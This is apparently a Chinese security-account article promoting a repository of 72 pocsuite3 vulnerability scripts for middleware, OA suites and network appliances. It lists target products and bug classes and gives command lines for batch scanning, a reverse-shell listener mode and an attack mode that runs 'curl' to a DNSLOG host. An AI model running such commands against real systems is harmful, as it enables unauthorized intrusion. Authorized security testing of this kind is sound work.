#  一个仓库塞进72个现成PoC！主流中间件、OA、网络设备的漏洞验证脚本被一次性打包带走  
棉花糖糖糖
                    棉花糖糖糖  棉花糖网络安全工具箱   2026-11-04 02:40  
  
免责声明：本文仅用于合法授权范围内的安全测试与技术研究，禁止用于任何未经授权的目标探测与利用行为。因使用本文内容产生的直接或间接后果，由使用者自行承担。
这是一个面向漏洞验证场景的 PoC 集合仓库。它以 pocsuite3 框架为统一底座，把散落在厂商公告、CNVD/CVE 编号、公众号文章里的漏洞验证逻辑，收拢成一份可直接命令行调用的脚本目录。仓库内共包含 72 个 Python 脚本，覆盖 Web 框架、应用中间件、协同办公系统、网络安全设备、数据库与国产化业务平台等方向，绝大多数脚本带有 CVE 或 CNVD 编号，多数同时附带检测逻辑与利用逻辑。
重点导读项目定位

漏洞验证脚本集合
pocsuite3 框架适配
厂商维度组织
编号维度检索
检测与利用合一

仓库不提供 GUI，不提供插件市场，也不提供漏洞管理后台。它提供的是最底层的东西：一堆能跑起来的脚本。对已经知道目标是什么漏洞、只想快速确认漏洞是否存在或者直接拿到命令执行权限的使用者而言，这种形态比任何平台都直接。
重点导读目录组织
PART 01层级规则

一级目录：厂商或产品线
二级目录：漏洞族或具体产品
三级目录：单个 CVE 编号
脚本命名：漏洞中文描述
脚本后缀：.py

例如 F5-BIG-IP/CVE-2022-1388/、Apache/Apache_CouchDB/、spring/spring-cloud-function-rce/。目录名本身就是索引，不依赖任何搜索功能。
PART 02特殊目录

Goby&poc/：JSON 与 Go 格式的跨平台 PoC
2021hvv漏洞/：HVV 期间公开的漏洞
Foreign/：境外产品线

Goby&poc 目录并非 pocsuite3 脚本，而是另一套格式的验证器，可直接导入 Goby 扫描器使用。这一点让仓库同时具备两种消费方式：命令行与图形化工具。
重点导读技术架构
PART 03代码骨架

POCBase 子类
register_poc 注册
vulID / version / vulType
appName / appVersion
references / samples
_options 方法
_verify 方法
REVERSE_PAYLOAD
POC_CATEGORY.EXPLOITS.REMOTE

PART 04字段体系
每个脚本顶部是一段高度统一的元数据块：漏洞编号、编写日期、公开日期、影响版本区间、漏洞类型、参考链接。版本区间使用区间表达式书写，便于脚本对目标版本做前置判断。
PART 05运行模式

验证模式
利用模式
Shell 模式
本地监听
远程监听
DNSLOG 外带
自定义命令

PART 06依赖

Python 3
pocsuite3
requests
requests_toolbelt

requests_toolbelt 主要服务于 multipart 文件上传类 PoC，例如各类任意文件上传漏洞的构造。
重点导读漏洞类型
PART 07远程代码执行
涵盖 Struts2 S2-001、WebLogic LDAP 注入、Confluence OGNL、Spring Cloud Function SpEL、CouchDB 3.2.1、Zimbra 路径穿越、Shiro 之外的多种模板注入与表达式注入路径。
PART 08任意文件上传
集中在 OA 与中台产品：泛微 e-office 10、泛微 e-office UploadFile.php、用友 KSOA、畅捷通 T+、天问物业 ERP、绿盟 NGFW、SPON IP 对讲广播系统。
PART 09任意文件读取
覆盖 Grafana、Gerapy、Metabase GeoJSON、Apache Druid、Apache 2.4.49 路径穿越、SolarView、Webgrind、Ivanti Avalanche。
PART 10身份认证绕过
F5 BIG-IP iControl REST 身份验证绕过、明御 WAF 登录绕过、友点 CMS 登录绕过、EYouCMS 登录绕过、致远 OA 任意用户登录。
PART 11SQL 注入
禅道 SQL 注入、致翔 OA 两处 msg 接口 SQL 注入、孚盟云前台 SQL 注入、网御星云 Leadsec ACM SQL 注入、360 天擎 SQL 注入、杭州法源软件 SQL 注入。
PART 12未授权访问
ClickHouse 8123 端口未授权访问、泛微 OA 数据库配置文件读取、网御星云账号密码泄露、CHIYU 指纹机默认口令、Crestron 设备账号密码泄露。
PART 13SSRF
VMware vRealize Operations Manager SSRF。
重点导读覆盖范围
PART 14Web 框架
Struts2、Spring Cloud Function、Spring Cloud Function SpEL 表达式注入路径。
PART 15应用中间件
Apache HTTP Server、Apache OFBiz、Apache Druid、Apache CouchDB、Apache APISIX Dashboard、Apache ShenYu Admin、WebLogic、Struts2。
PART 16协同办公
Confluence、泛微 OA 系列、致远 OA、致翔 OA、蓝凌 OA、禅道、天问物业 ERP、畅捷通、用友 KSOA。
PART 17安全设备
F5 BIG-IP、天融信上网行为管理系统、绿盟 NGFW、网御星云 ACM、明御 WAF、H3C SecParh 堡垒机、Sapido 路由、SolarView、SPON IP 网络对讲系统。
PART 18视频与物联
好视通视频会议系统、H5S 视频平台、CHIYU 指纹机。
PART 19数据库与监控
ClickHouse、Grafana、Gerapy、Metabase、Jellyfin、GoCD。
PART 20国产生态
用友、致远、泛微、蓝凌、禅道、畅捷通、天融信、绿盟、网御星云、明御、孚盟云、杭州法源、友点、EYouCMS。
重点导读编写范式
PART 21通用骨架
pythonfrom pocsuite3.api import POCBase, register_poc, requests, OptDict, VUL_TYPE
from pocsuite3.api import REVERSE_PAYLOAD, POC_CATEGORY

class POC(POCBase):
    vulID = '0'
    version = '1'
    name = 'example'
    appName = 'example'
    appVersion = '1.0.0 < app < 2.0.0'
    vulType = VUL_TYPE.COMMAND_EXECUTION
    desc = '''
        漏洞简述
    '''
    category = POC_CATEGORY.EXPLOITS.REMOTE

    def _options(self):
        o = OptDict()
        return o

    def _verify(self):
        pass

register_poc(POC)

PART 22元数据密度
元数据块承担三种职责：漏洞识别、影响范围描述、脚本自描述。第三方工具读取该仓库时，可直接解析脚本头部而不必执行代码。
PART 23状态判定
验证逻辑普遍采用响应特征匹配：状态码、响应体关键字、报错文本、OGNL 渲染结果、异常堆栈特征。命中即判定为存在漏洞。
PART 24利用扩展
具备条件时，脚本在同一份代码内同时提供反弹 Shell 与外带 DNSLOG 两条路径，减少重复调试成本。
PART 25本地验证
Spring Cloud Function SpEL 远程代码执行脚本的本地监听模式执行效果如下。
Spring Cloud Function SpEL 远程代码执行 PoC 本地监听执行结果
对应的命令形式为：
bashpocsuite -r Spring-Cloud-Function-SpEL-RCE.py -u http://127.0.0.1:8080 --shell --lhost 0.0.0.0 --lport 6666

重点导读使用方式
PART 26环境准备
bashpip install pocsuite3
pip install requests_toolbelt

PART 27单目标验证
bashpocsuite -r poc.py -u http://target:port

PART 28批量目标
bashpocsuite -r poc.py -f url.txt

PART 29Shell 模式
bashpocsuite -r poc.py -u http://target:port --shell --lhost lhost --lport lport

PART 30外带模式
bashpocsuite -r poc.py -u http://target:port --attack --command "curl xxxxx.dnslog.cn"

PART 31批量并发
pocsuite3 原生支持多线程调度与结果导出，可直接对接资产清单进行漏洞面扫描。
重点导读工程价值
PART 32复用成本
每个脚本均可独立运行，无需先启动平台、配置插件、编写调度任务。
PART 33覆盖效率
72 个脚本已覆盖多个主流技术栈与大量国产业务系统，短期内不必重复造轮子。
PART 34二次开发
统一的类结构与命名规范，使新增漏洞的接入成本被压缩到复制模板、替换请求与匹配逻辑的量级。
PART 35编号追溯
绝大多数脚本绑定 CVE 或 CNVD 编号，便于与公开披露记录、厂商修复公告逐条对齐。
PART 36检测与利用同源
同一份脚本在验证模式与利用模式下共用同一段请求构造，减少因两套实现不一致导致的漏报。
重点导读合规提示
仓库中的脚本面向合法授权的安全建设与自测场景。请自行搭建测试环境验证脚本可用性，确认目标归属与授权范围后再进行操作。禁止对未授权目标进行扫描、验证或利用。
重点导读开源地址
本文介绍的项目开源地址如下：
本公众号非项目作者，仅做技术分享。
https://github.com/xanszZZ/pocsuite3-poc

## 广告时间  


  
    低价考证包括但不限于CISP系列、PMP等等国内网安证书、网络安全交流群请关注公众号后点菜单栏的找棉花糖。
  
  
    糖心会员站，网络安全必备网站，包括在线内网靶场、web靶场、src靶场、应急响应靶场，以及各种网安资料、教程、方案模版、以及超级多在线工具，99元包年！详细介绍：棉花糖会员站介绍(26年4月26日版本) ：在线内网靶场、网安资料方案、在线工具全能资源站，看完介绍百分百心动！
  
  
    
  
  
    
  
